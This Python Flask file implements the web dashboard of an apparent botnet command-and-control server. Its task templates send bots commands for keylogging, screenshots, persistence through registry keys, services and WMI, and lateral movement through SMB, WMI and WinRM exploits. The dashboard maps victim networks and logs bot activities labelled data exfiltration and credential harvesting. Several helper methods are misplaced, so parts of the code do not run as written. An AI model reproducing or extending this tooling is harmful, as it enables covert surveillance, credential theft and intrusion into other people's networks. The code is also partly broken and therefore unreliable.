from flask import Flask, render_template, jsonify, request, send_file, abort
from flask_socketio import SocketIO, emit
from flask_login import LoginManager, UserMixin, login_required, current_user
import json
from datetime import datetime
import plotly
import plotly.graph_objs as go
import networkx as nx
from reportlab.pdfgen import canvas
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
from reportlab.lib.styles import getSampleStyleSheet
import io
import pyotp
import threading
import psutil
from typing import Dict, List, Any, Optional
from dataclasses import asdict
from collections import deque

class User(UserMixin):
    def __init__(self, id: str):
        self.id = id
        self.totp = pyotp.TOTP(pyotp.random_base32())
        self.roles = ['admin']  # Basic role system

class WebInterface:
    def __init__(self, server):
        self.server = server
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = 'your-secret-key'
        self.socketio = SocketIO(self.app, async_mode='threading')
        self.login_manager = LoginManager()
        self.login_manager.init_app(self.app)
        self.users: Dict[str, User] = {}
        self.task_templates = self._load_task_templates()
        
        # Network visualization
        self.graph = nx.Graph()
        self.layout = None
        self.layout_lock = threading.Lock()

        # Monitoring data storage
        # Enhanced monitoring with longer history and more metrics
        self.system_metrics = {
            'cpu': deque(maxlen=3600),  # 1 hour of data
            'memory': deque(maxlen=3600),
            'network': deque(maxlen=3600),
            'disk': deque(maxlen=3600),
            'network_connections': deque(maxlen=3600),
            'process_count': deque(maxlen=3600),
            'throughput': deque(maxlen=3600)
        }
        
        # Bot management enhancements
        self.bot_groups = {}  # Group name -> list of bot IDs
        self.bot_tags = {}    # Tag -> list of bot IDs
        self.scheduled_tasks = []  # List of scheduled commands
        
        # Bot activity tracking
        self.bot_activities = deque(maxlen=100)  # Last 100 activities
        
        # Alert thresholds
        self.alert_thresholds = {
            'cpu': 80,  # CPU usage above 80%
            'memory': 90,  # Memory usage above 90%
            'disk': 90,  # Disk usage above 90%
            'network': 1000000  # Network usage above 1MB/s
        }
        
        # Register routes and handlers
        self.register_routes()
        self.register_socketio_handlers()
        
    def _load_task_templates(self) -> Dict[str, Dict]:
        return {
            'recon': {
                'name': 'Network Reconnaissance',
                'description': 'Gather information about network and systems',
                'commands': [
                    'network_discovery scan quick',
                    'service_detection',
                    'os_fingerprint',
                    'enum_shares'
                ]
            },
            'monitor': {
                'name': 'System Monitoring',
                'description': 'Monitor system activities and resources',
                'commands': [
                    'start_keylogger',
                    'screenshot interval=30',
                    'process_monitor',
                    'network_monitor'
                ]
            },
            'persistence': {
                'name': 'Setup Persistence',
                'description': 'Establish persistent access',
                'commands': [
                    'install_service',
                    'add_registry_keys',
                    'create_scheduled_task',
                    'setup_wmi_persistence'
                ]
            },
            'lateral': {
                'name': 'Lateral Movement',
                'description': 'Move laterally in the network',
                'commands': [
                    'scan_credentials',
                    'exploit_smb',
                    'exploit_wmi',
                    'exploit_winrm'
                ]
            }
        }

    def register_routes(self):
        @self.login_manager.user_loader
        def load_user(user_id: str) -> Optional[User]:
            return self.users.get(user_id)

        @self.app.route('/')
        @login_required
        def index():
            return render_template(
                'dashboard.html',
                user=current_user,
                templates=self.task_templates
            )

        @self.app.route('/api/network/map')
        @login_required
        def get_network_map():
            """Get network topology visualization data"""
            try:
                # Get latest network data
                network_data = self.server.network_discovery.get_network_map()
                
                # Update graph
                with self.layout_lock:
                    self.graph.clear()
                    
                    # Add nodes
                    for ip, host in network_data['hosts'].items():
                        self.graph.add_node(
                            ip,
                            **{
                                'type': 'host',
                                'hostname': host['hostname'],
                                'os': host.get('fingerprint', {}).get('os_match'),
                                'importance': host.get('importance_score', 0),
                                'tags': host.get('tags', [])
                            }
                        )
                        
                    # Add subnet nodes
                    for subnet, hosts in network_data['subnets'].items():
                        self.graph.add_node(
                            subnet,
                            type='subnet',
                            hosts=len(hosts)
                        )
                        # Connect hosts to subnet
                        for host in hosts:
                            self.graph.add_edge(subnet, host)
                            
                    # Calculate layout if needed
                    if not self.layout or len(self.layout) != len(self.graph):
                        self.layout = nx.spring_layout(self.graph)
                        
                    # Prepare visualization data
                    nodes = []
                    for node, attrs in self.graph.nodes(data=True):
                        pos = self.layout[node]
                        nodes.append({
                            'id': node,
                            'x': float(pos[0]),
                            'y': float(pos[1]),
                            **attrs
                        })
                        
                    edges = [
                        {'source': u, 'target': v}
                        for u, v in self.graph.edges()
                    ]
                    
                return jsonify({
                    'nodes': nodes,
                    'edges': edges,
                    'stats': network_data.get('statistics', {})
                })
                
            except Exception as e:
                return jsonify({'error': str(e)}), 500

        @self.app.route('/api/network/hosts')
        @login_required
        def get_network_hosts():
            """Get detailed host information"""
            try:
                search = request.args.get('search', '')
                os_filter = request.args.get('os', '')
                service_filter = request.args.get('service', '')
                tag_filter = request.args.get('tag', '')
                
                hosts = []
                network_data = self.server.network_discovery.get_network_map()
                
                for ip, host in network_data['hosts'].items():
                    # Apply filters
                    if search and search.lower() not in ip.lower() and \
                       search.lower() not in host.get('hostname', '').lower():
                        continue
                        
                    if os_filter and os_filter not in \
                       host.get('fingerprint', {}).get('os_match', '').lower():
                        continue
                        
                    if service_filter and not any(
                        service_filter in s['name'].lower()
                        for s in host.get('services', {}).values()
                    ):
                        continue
                        
                    if tag_filter and tag_filter not in host.get('tags', []):
                        continue
                        
                    hosts.append(host)
                    
                return jsonify(hosts)
                
            except Exception as e:
                return jsonify({'error': str(e)}), 500

        @self.app.route('/api/network/services')
        @login_required
        def get_network_services():
            """Get service information across network"""
            try:
                services = {}
                network_data = self.server.network_discovery.get_network_map()
                
                for ip, host in network_data['hosts'].items():
                    for port, service in host.get('services', {}).items():
                        service_name = service['name']
                        if service_name not in services:
                            services[service_name] = {
                                'count': 0,
                                'hosts': [],
                                'versions': set()
                            }
                            
                        services[service_name]['count'] += 1
                        services[service_name]['hosts'].append(ip)
                        if service.get('version'):
                            services[service_name]['versions'].add(service['version'])
                            
                return jsonify({
                    name: {
                        'count': data['count'],
                        'hosts': data['hosts'],
                        'versions': list(data['versions'])
                    }
                    for name, data in services.items()
                })
                
            except Exception as e:
                return jsonify({'error': str(e)}), 500

        @self.app.route('/api/network/statistics')
        @login_required
        def get_network_statistics():
            """Get detailed network statistics"""
            try:
                return jsonify(
                    self.server.network_discovery.get_statistics()
                )
            except Exception as e:
                return jsonify({'error': str(e)}), 500

        @self.app.route('/api/report/network')
        @login_required
        def generate_network_report():
            """Generate comprehensive network report"""
            try:
                buffer = io.BytesIO()
                doc = SimpleDocTemplate(buffer, pagesize=letter)
                styles = getSampleStyleSheet()
                elements = []
                
                # Title
                elements.append(Paragraph(
                    "Network Analysis Report",
                    styles['Heading1']
                ))
                
                # Network Overview
                elements.append(Paragraph(
                    "Network Overview",
                    styles['Heading2']
                ))
                
                stats = self.server.network_discovery.get_statistics()
                overview_data = [
                    ['Total Hosts', stats['total_hosts']],
                    ['Active Hosts', stats['active_hosts']],
                    ['Subnets', stats['subnets']],
                    ['Domains', stats['domains']]
                ]
                
                elements.append(Table(
                    overview_data,
                    style=TableStyle([
                        ('GRID', (0, 0), (-1, -1), 1, colors.black),
                        ('BACKGROUND', (0, 0), (0, -1), colors.lightgrey)
                    ])
                ))
                
                # OS Distribution
                elements.append(Paragraph(
                    "OS Distribution",
                    styles['Heading2']
                ))
                
                os_data = [[os, count] for os, count in 
                          stats['os_distribution'].items()]
                if os_data:
                    elements.append(Table(
                        [['Operating System', 'Count']] + os_data,
                        style=TableStyle([
                            ('GRID', (0, 0), (-1, -1), 1, colors.black),
                            ('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey)
                        ])
                    ))
                    
                # Services Summary
                elements.append(Paragraph(
                    "Network Services",
                    styles['Heading2']
                ))
                
                service_data = [[service, count] for service, count in 
                              stats['services'].items()]
                if service_data:
                    elements.append(Table(
                        [['Service', 'Count']] + service_data,
                        style=TableStyle([
                            ('GRID', (0, 0), (-1, -1), 1, colors.black),
                            ('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey)
                        ])
                    ))
                    
                # Important Hosts
                elements.append(Paragraph(
                    "Critical Systems",
                    styles['Heading2']
                ))
                
                if stats['top_hosts']:
                    top_hosts_data = []
                    for host in stats['top_hosts']:
                        top_hosts_data.append([
                            host['ip'],
                            host.get('hostname', 'N/A'),
                            host.get('fingerprint', {}).get('os_match', 'Unknown'),
                            str(host['importance_score'])
                        ])
                        
                    elements.append(Table(
                        [['IP', 'Hostname', 'OS', 'Importance']] + top_hosts_data,
                        style=TableStyle([
                            ('GRID', (0, 0), (-1, -1), 1, colors.black),
                            ('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey)
                        ])
                    ))
                    
                # Build and return PDF
                doc.build(elements)
                buffer.seek(0)
                
                return send_file(
                    buffer,
                    as_attachment=True,
                    download_name=f'network_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf',
                    mimetype='application/pdf'
                )
                
            except Exception as e:
                return jsonify({'error': str(e)}), 500

    def register_socketio_handlers(self):
        @self.socketio.on('connect')
        def handle_connect():
            """Handle new WebSocket connection"""
            print(f'Client connected: {request.sid}')
            
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """Handle WebSocket disconnection"""
            print(f'Client disconnected: {request.sid}')
            
        def system_metrics_broadcast():
            """Enhanced system metrics monitoring and broadcasting"""
            while True:
                try:
                    # Collect enhanced system metrics
                    cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
                    memory = psutil.virtual_memory()
                    disk = psutil.disk_usage('/')
                    net_io = psutil.net_io_counters()
                    connections = len(psutil.net_connections())
                    process_count = len(psutil.pids())
                    
                    # Calculate network throughput
                    current_bytes = net_io.bytes_sent + net_io.bytes_recv
                    throughput = current_bytes - self.previous_bytes if hasattr(self, 'previous_bytes') else 0
                    self.previous_bytes = current_bytes
                    
                    # Store enhanced metrics
                    timestamp = datetime.now()
                    self.system_metrics['cpu'].append((timestamp, sum(cpu_percent)/len(cpu_percent)))
                    self.system_metrics['memory'].append((timestamp, memory.percent))
                    self.system_metrics['disk'].append((timestamp, disk.percent))
                    self.system_metrics['network'].append((timestamp, net_io.bytes_sent + net_io.bytes_recv))
                    self.system_metrics['network_connections'].append((timestamp, connections))
                    self.system_metrics['process_count'].append((timestamp, process_count))
                    self.system_metrics['throughput'].append((timestamp, throughput))
                    
                    # Calculate advanced analytics
                    analytics = self._calculate_advanced_analytics()
                    
                    # Check thresholds and generate alerts
                    alerts = []
                    if cpu_percent > self.alert_thresholds['cpu']:
                        alerts.append(f"High CPU usage: {cpu_percent}%")
                    if memory.percent > self.alert_thresholds['memory']:
                        alerts.append(f"High memory usage: {memory.percent}%")
                    if disk.percent > self.alert_thresholds['disk']:
                        alerts.append(f"High disk usage: {disk.percent}%")
                    
                    # Emit enhanced metrics update
                    self.socketio.emit('system_metrics', {
                        'cpu': {
                            'average': sum(cpu_percent)/len(cpu_percent),
                            'per_core': cpu_percent
                        },
                        'memory': {
                            'percent': memory.percent,
                            'available': memory.available,
                            'used': memory.used
                        },
                        'disk': {
                            'percent': disk.percent,
                            'free': disk.free,
                            'used': disk.used
                        },
                        'network': {
                            'sent': net_io.bytes_sent,
                            'recv': net_io.bytes_recv,
                            'connections': connections,
                            'throughput': throughput
                        },
                        'processes': {
                            'count': process_count,
                            'top_cpu': analytics['top_cpu_processes'],
                            'top_memory': analytics['top_memory_processes']
                        },
                        'timestamp': timestamp.isoformat(),
                        'alerts': alerts,
                        'analytics': analytics
                    })
                    
                except Exception as e:
                    print(f"Error in system metrics broadcast: {e}")
                    
                self.socketio.sleep(1)  # Update every second

        def network_status_broadcast():
            """Broadcast network status updates"""
            while True:
                try:
                    network_data = self.server.network_discovery.get_network_map()
                    stats = self.server.network_discovery.get_statistics()
                    
                    # Calculate changes since last update
                    changes = {
                        'new_hosts': [],
                        'removed_hosts': [],
                        'service_changes': []
                    }
                    
                    # Emit updates
                    self.socketio.emit('network_update', {
                        'hosts': network_data['hosts'],
                        'stats': stats,
                        'changes': changes,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                except Exception as e:
                    print(f"Error in network status broadcast: {e}")
                    
                self.socketio.sleep(5)  # Update every 5 seconds

        def bot_activity_broadcast():
            """Enhanced bot activity monitoring and management"""
            while True:
                try:
                    active_bots = self.server.get_active_bots()
                    bot_updates = []
                    
                    for bot in active_bots:
                        # Get enhanced bot status and activities
                        status = bot.get_status()
                        activities = bot.get_recent_activities()
                        resources = bot.get_resource_usage()
                        location = bot.get_location_info()
                        
                        # Track significant activities with enhanced details
                        for activity in activities:
                            if activity['type'] in ['command_executed', 'data_exfiltrated', 'credential_harvested',
                                                  'lateral_movement', 'persistence_established']:
                                self.bot_activities.append({
                                    'bot_id': bot.id,
                                    'timestamp': activity['timestamp'],
                                    'type': activity['type'],
                                    'details': activity['details'],
                                    'success_rate': activity.get('success_rate', 100),
                                    'resource_impact': activity.get('resource_impact', 'low')
                                })
                        
                        # Update bot groups and tags
                        self._update_bot_grouping(bot)
                        
                        # Prepare enhanced bot update
                        update = {
                            'bot_id': bot.id,
                            'status': status,
                            'activities': activities,
                            'resources': resources,
                            'location': location,
                            'groups': self._get_bot_groups(bot.id),
                            'tags': self._get_bot_tags(bot.id),
                            'success_rate': self._calculate_bot_success_rate(bot.id),
                            'timestamp': datetime.now().isoformat()
                        }
                        bot_updates.append(update)
                        
                    # Batch emit bot updates
                    self.socketio.emit('bot_updates', {
                        'updates': bot_updates,
                        'total_active': len(active_bots),
                        'group_stats': self._get_group_statistics(),
                        'tag_stats': self._get_tag_statistics()
                    })
                    
                except Exception as e:
                    print(f"Error in bot activity broadcast: {e}")
                    
                self.socketio.sleep(2)  # Update every 2 seconds
                
        # Helper methods for enhanced functionality
        def _calculate_advanced_analytics(self):
            """Calculate advanced system and network analytics"""
            try:
                analytics = {
                    'top_cpu_processes': [],
                    'top_memory_processes': [],
                    'network_patterns': {},
                    'performance_trends': {},
                    'resource_correlation': {}
                }
                
                # Get top resource-consuming processes
                for proc in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']),
                                 key=lambda p: p.info['cpu_percent'],
                                 reverse=True)[:5]:
                    analytics['top_cpu_processes'].append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'cpu_percent': proc.info['cpu_percent']
                    })
                
                for proc in sorted(psutil.process_iter(['pid', 'name', 'memory_percent']),
                                 key=lambda p: p.info['memory_percent'],
                                 reverse=True)[:5]:
                    analytics['top_memory_processes'].append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'memory_percent': proc.info['memory_percent']
                    })
                
                # Calculate performance trends
                for metric, values in self.system_metrics.items():
                    if len(values) >= 60:  # At least 1 minute of data
                        recent_values = [v[1] for v in list(values)[-60:]]
                        analytics['performance_trends'][metric] = {
                            'mean': sum(recent_values) / len(recent_values),
                            'min': min(recent_values),
                            'max': max(recent_values),
                            'trend': 'increasing' if recent_values[-1] > recent_values[0] else 'decreasing'
                        }
                
                return analytics
            except Exception as e:
                print(f"Error calculating analytics: {e}")
                return {}
                
        def _update_bot_grouping(self, bot):
            """Update bot groups and tags based on characteristics"""
            # Group by OS
            os_group = f"os_{bot.get_os_info()['type']}"
            if os_group not in self.bot_groups:
                self.bot_groups[os_group] = set()
            self.bot_groups[os_group].add(bot.id)
            
            # Group by location
            location = bot.get_location_info().get('country', 'unknown')
            location_group = f"location_{location}"
            if location_group not in self.bot_groups:
                self.bot_groups[location_group] = set()
            self.bot_groups[location_group].add(bot.id)
            
            # Add tags based on capabilities
            bot_capabilities = bot.get_capabilities()
            for capability in bot_capabilities:
                tag = f"capability_{capability}"
                if tag not in self.bot_tags:
                    self.bot_tags[tag] = set()
                self.bot_tags[tag].add(bot.id)
                
        def _get_bot_groups(self, bot_id):
            """Get all groups a bot belongs to"""
            return [group for group, members in self.bot_groups.items()
                   if bot_id in members]
                   
        def _get_bot_tags(self, bot_id):
            """Get all tags associated with a bot"""
            return [tag for tag, members in self.bot_tags.items()
                   if bot_id in members]
                   
        def _calculate_bot_success_rate(self, bot_id):
            """Calculate bot's command success rate"""
            try:
                activities = [a for a in self.bot_activities
                            if a['bot_id'] == bot_id]
                if not activities:
                    return 100
                    
                successful = sum(1 for a in activities
                               if a.get('success_rate', 100) == 100)
                return (successful / len(activities)) * 100
            except Exception:
                return 100
                
        def _get_group_statistics(self):
            """Get statistics for bot groups"""
            return {
                group: {
                    'count': len(members),
                    'active': sum(1 for bot_id in members
                                if self.server.is_bot_active(bot_id)),
                    'success_rate': sum(self._calculate_bot_success_rate(bot_id)
                                      for bot_id in members) / len(members)
                                      if members else 100
                }
                for group, members in self.bot_groups.items()
            }
            
        def _get_tag_statistics(self):
            """Get statistics for bot tags"""
            return {
                tag: {
                    'count': len(members),
                    'active': sum(1 for bot_id in members
                                if self.server.is_bot_active(bot_id)),
                    'success_rate': sum(self._calculate_bot_success_rate(bot_id)
                                      for bot_id in members) / len(members)
                                      if members else 100
                }
                for tag, members in self.bot_tags.items()
            }

        # Start background tasks
        self.socketio.start_background_task(network_status_broadcast)
        self.socketio.start_background_task(system_metrics_broadcast)
        self.socketio.start_background_task(bot_activity_broadcast)
        
    def start(self, host: str = '0.0.0.0', port: int = 5000, debug: bool = False):
        """Start web interface"""
        self.socketio.run(self.app, host=host, port=port, debug=debug)